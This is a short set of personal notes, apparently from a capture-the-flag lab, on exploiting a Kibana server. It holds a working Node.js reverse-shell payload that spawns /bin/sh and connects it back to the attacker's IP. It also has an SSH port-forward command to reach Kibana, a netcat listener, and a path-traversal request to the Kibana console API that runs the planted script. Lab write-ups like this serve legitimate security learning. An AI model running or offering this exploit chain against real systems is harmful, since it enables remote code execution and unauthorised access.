#rev shell: the ip is the vpn ip and the port is w.e
https://github.com/appsecco/vulnerable-apps/tree/master/node-reverse-shell
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(9119, "10.10.14.76", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();

#localhost:1234 opens kibana
ssh -L 1234:localhost:5601: security@10.10.10.115

#ssh -L AAAAAA:BBBBBBB:CCCCCCC:DDDDDD@EEEEEEEEE
A:  my local port
B:  an ip accessed by the remote host of creds given as D@E
C:  port accessed by B
D:  user
E:  remote ip target
so.... on my localhost:A access B:C as if I were D@E

# listen on the port
nc -lvp PORT_IN_JS

#runs the js to connect to the nc listenting port
http://localhost:1234/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../tmp/.krs2.js

# must create new js each time for some reason
#
# check etc/logstash for config.d files
# /usr/share/kibana/bin/../node/bin/node --no-warnings /usr/share/kibana/bin/../src/cli -c /etc/kibana/kibana.yml
